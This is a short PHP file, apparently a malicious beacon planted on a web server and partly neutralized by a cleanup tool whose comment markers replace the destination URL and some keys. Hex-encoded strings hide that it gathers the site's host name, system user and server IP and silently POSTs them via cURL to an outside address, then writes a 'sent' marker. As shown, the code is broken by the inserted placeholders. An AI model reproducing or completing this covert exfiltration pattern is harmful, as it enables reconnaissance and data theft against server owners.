<?php
/* [FLAME-V1-COMMANDER-FIX: SMM_GOTO_JUMP NEUTRALIZED] */
$_F = __DIR__ . '/' . "/* [FLAME-V1-COMMANDER-FIX: HEX_MASSIVE_INJ NEUTRALIZED] */";

if (!file_exists($_F) || file_exists($_F)) {
    $_D = array(
        "\x64\x6f\x6d\x61\x69\x6e" => $_SERVER["\x48\x54\x54\x50\x5f\x48\x4f\x53\x54"] ?? "/* [FLAME-V1-COMMANDER-FIX: HEX_MASSIVE_INJ NEUTRALIZED] */",
        "/* [FLAME-V1-COMMANDER-FIX: HEX_MASSIVE_INJ NEUTRALIZED] */" => getenv("\x55\x53\x45\x52") ?: "/* [FLAME-V1-COMMANDER-FIX: HEX_MASSIVE_INJ NEUTRALIZED] */",
        "\x73\x65\x72\x76\x65\x72\x5f\x69\x70" => $_SERVER["/* [FLAME-V1-COMMANDER-FIX: HEX_MASSIVE_INJ NEUTRALIZED] */"] ?? "/* [FLAME-V1-COMMANDER-FIX: HEX_MASSIVE_INJ NEUTRALIZED] */",
    );

    $_U = "/* [FLAME-V1-COMMANDER-FIX: HEX_MASSIVE_INJ NEUTRALIZED] */";

    $_C = curl_init($_U);
    curl_setopt($_C, CURLOPT_POST, true);
    curl_setopt($_C, CURLOPT_POSTFIELDS, http_build_query($_D));
    curl_setopt($_C, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($_C, CURLOPT_TIMEOUT, 3);
    @curl_exec($_C);
    curl_close($_C);

    file_put_contents($_F, "\x73\x65\x6e\x74");
}